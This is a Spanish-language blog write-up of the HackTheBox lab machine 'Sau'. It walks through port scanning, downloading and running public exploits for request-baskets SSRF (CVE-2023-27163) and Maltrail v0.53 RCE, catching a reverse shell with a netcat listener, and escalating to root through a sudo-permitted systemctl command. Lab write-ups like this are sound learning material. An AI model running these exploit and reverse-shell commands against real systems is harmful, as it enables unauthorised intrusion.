---
layout: post
title: "Sau"
date: 2025-11-30 18:30:00 -0300
categories: [Writeups,Sau]
tags: [Htb, Sau, Linux]
description: "Writeup de la máquina Sau de Hackthebox"
image: /assets/images/hackthebox.png
---
## Resumen de la resolución

**Sau** es una máquina **Linux** de dificultad **Easy** de la plataforma de **HackTheBox**, es una máquina  la cual consta con dos puertos abiertos.

---
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_Frasan15.opvn
```

Luego le lanzamos un **ping** para comprobar si la maquina esta activa. Verificamos que responde correctamente devolviendo el paquete enviado. A continuacion, utilizamos un script propio que, a partir del valor del  **ttl**  permite identificar el tipo de sistema operativo: **Linux (TTL 64 )** o **Windows (TTL 128)**, en este caso, observamos un **TTL** próximo a 64 (**64**) por lo que se trata de una máquina **Linux**

> El motivo por el cual el **TTL** es de **64** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.129.43.188`.

### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap 10.129.43.188 -p- --open -T5 -v -n -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22** y **55555**.

Ahora, gracias a la utilidad **extractPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto

```bash
nmap -sC -sV -p22,55555 10.129.43.188 -oN targeted
```

En dichos escaneos de **Nmap**, lo primero que llama la atención es que el puerto 55555 nos redirige a un sitio web con ruta **/web**.

### Puerto 22 - SSH 

Como hacemos normalmente intentamos iniciar sesion en el servicio **SSH** con credenciales por defecto pero no tenemos exito. 

### Puerto 55555

Al ingresar al sitio web con url: **http://10.129.43.188:55555/web** en la parte inferior del sitio vemos que utiliza **request-baskets | Version: 1.2.1** por lo que buscamos en el navegador alguna vulnerabilidad para ese servicio.
Luego de investigar identificamos dicho exploit: **https://github.com/entr0pie/CVE-2023-27163**.

Para utilizar dicho exploit usamos los siguientes comandos:


```bash
wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh
chmod +x CVE-2023-27163.sh
bash ./CVE-2023-27163.sh http://10.129.43.188:55555 http://127.0.0.1:80
curl http://10.129.43.188:55555/<nombre_del_basket>
```
Al visitar el bucket recién creado se reveló una página la cual tiene una pista de la versión de Mailtrail. Por lo que gracias a dicha pista encontramos otra vulnerabilidad estilo **RCE**.

## Explotacion

Para explotar la vulnerabilidad dicha anteriormente utilizamos estos comandos:


```bash
git clone https://github.com/spookier/Maltrail-v0.53-Exploit.git
cd Maltrail-v0.53-Exploit
```
Al utilizar esos comandos ya tendriamos instalado el exploit por lo que solo nos estaria faltar ponerlo en marcha, para eso primos debemos abrir netcat en otra terminal de la siguiente forma:

```bash
nc -lvnp 4444
```
Una vez teniendo el puerto en escucha y volviendo a la terminal anterior ejecutamos el siguiente comando para explotarla:


```bash
python3 exploit.py 10.10.15.232 4444 http://10.129.43.188:55555/yhzhml
```
Al ejecutar dicho comando logramos ver como el la terminal donde tenemos netcat escuchando logramos acceder a la consola como usuario puma.
Para identificar la flag de usuario utilizamos el siguiente comando:


```bash
ls /home/puma
cat user.txt
```
## Escalada de privilegios

Como vimos anteriormente logramos acceder como usuario **puma** el siguiente paso es escalar privilegios y lograr convertirnos en root, para eso lo hacemos de la siguiente forma:

Ejecutamos este comando para ver permisos:

```bash
sudo -l
```
Dicho comando nos dice que puma puede ejecutar systemctl como root, sin contraseña. Por lo que pasamos a utilizar el ultimo comando para la escalada de privilegios:


```bash
sudo /usr/bin/systemctl status trail.service
```
Para confirmar si todo salio como queriamos realizamos un **whoami** y listo. Ya tenemos acceso como usuario root.

La maquina **Sau** me parecio una maquina muy buena y divertida, y con muchas enseñanzas, es una maquina  muy recomendable de hacer.

